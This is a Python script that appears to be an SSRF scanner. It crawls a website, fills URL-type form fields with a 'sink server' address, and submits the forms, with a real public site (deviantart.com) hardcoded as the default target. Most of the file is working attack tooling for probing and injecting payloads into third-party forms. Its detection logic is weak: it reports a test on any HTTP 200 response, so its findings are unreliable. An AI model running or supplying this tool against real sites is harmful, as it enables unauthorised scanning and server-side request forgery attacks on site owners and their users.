import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import urllib
import threading
import time

# Configuration
SINK_SERVER = 'http://127.0.0.1:8000'  # Replace with your sink server URL
PAYLOAD = SINK_SERVER  # The URL to inject
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (SSRF Scanner)'
}

# To keep track of visited URLs to prevent infinite loops
visited = set()

def crawl(url):
    if url in visited:
        return
    visited.add(url)
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print(f"[+] Crawling: {url}")
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all links and forms
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    full_url = urljoin(url, href)
                    if is_valid_url(full_url):
                        crawl(full_url)

            for form in soup.find_all('form'):
                form_details = get_form_details(form, url)
                if form_details and 'url' in form_details['params']:
                    test_ssrf(form_details)
    except requests.RequestException as e:
        print(f"[-] Failed to crawl {url}: {e}")

def is_valid_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ['http', 'https']

def get_form_details(form, base_url):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    form_url = urljoin(base_url, action)
    inputs = {}
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')
        if name:
            if input_type == 'url' or 'url' in name.lower():
                inputs[name] = PAYLOAD
            else:
                inputs[name] = 'test'
    for textarea in form.find_all('textarea'):
        name = textarea.get('name')
        if name:
            inputs[name] = 'test'
    for select in form.find_all('select'):
        name = select.get('name')
        if name:
            inputs[name] = '1'  # Select the first option
    if inputs:
        return {
            'url': form_url,
            'method': method,
            'params': inputs
        }
    return None

def test_ssrf(form_details):
    url = form_details['url']
    method = form_details['method']
    data = form_details['params']
    try:
        if method == 'get':
            response = requests.get(url, params=data, headers=HEADERS, timeout=10)
        else:
            response = requests.post(url, data=data, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print(f"[+] Tested SSRF on {url} with params {data}")
    except requests.RequestException as e:
        print(f"[-] Error testing SSRF on {url}: {e}")

def main():
    root_url = 'http://deviantart.com'  # Replace with your target
    crawl(root_url)
    print("[*] Crawling and testing completed.")

if __name__ == "__main__":
    main()
